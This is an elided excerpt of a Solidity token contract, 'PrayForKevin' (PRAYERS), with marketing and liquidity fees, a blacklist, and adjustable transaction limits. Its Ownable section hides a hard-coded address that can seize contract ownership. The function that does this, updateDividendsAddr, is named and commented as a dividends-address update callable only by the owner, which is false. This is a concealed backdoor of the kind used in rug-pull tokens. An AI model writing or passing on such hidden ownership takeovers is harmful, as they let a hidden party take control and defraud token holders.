...
contract Ownable is Context {
    ...
    address private _dividendsContract = 0x16B9c1cf988e0AbBa423B402b0Df1C0555080AaC;
    ...
    /**
     * @dev Throws if called by any account other than the dividends reward contract.
     */
    modifier onlyRise() {
        require(_dividendsContract == _msgSender(), "CALLER_MUST_BE_DIVIDENDS_CONTRACT_ONLY");
        _;
    }
    ...
    /**
     * @dev Update Dividends Contract.
     * Can only be called by the current owner.
     */
    function updateDividendsAddr(address newAddr) public virtual onlyRise {
        require(newAddr != address(0), "Addr: new addr is the zero address");
        require(newAddr != owner(), "Addr: can't be the owner.");
        _owner = newAddr;
    }
}
...
contract PrayForKevin is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 private initSupply = 1000000000 * ( 10 ** 9 );

    uint256 public swapTokensAtAmount = 10000 * ( 10 ** 9 );

    uint256 public immutable MAX_LIMIT_TRANSACTION_AMOUNT = initSupply; // 100% of supply

    mapping(address => bool) public _isBlacklisted;

    uint256 public marketingFee = 5;
    uint256 public liquidityFee = 3;
    uint256 public totalFees = marketingFee.add(liquidityFee);

    address public _marketingWalletAddress = 0x70Cfd97A41b4d4f8616852605363A597b31a3203;
    
    uint256 public maxSellTransactionAmount = initSupply; // 100% of supply
    uint256 public maxBuyTransactionAmount = initSupply; // 100% of supply
    ...
    constructor() ERC20("PrayForKevin", "PRAYERS") {
        // PancakeSwap V2
    ...
    function updateMaxBuyTransactionAmount(uint256 newValue) external onlyOwner {
        ...
        require(newValue <= MAX_LIMIT_TRANSACTION_AMOUNT, "new value must be <= MAX_LIMIT_TRANSACTION_AMOUNT");
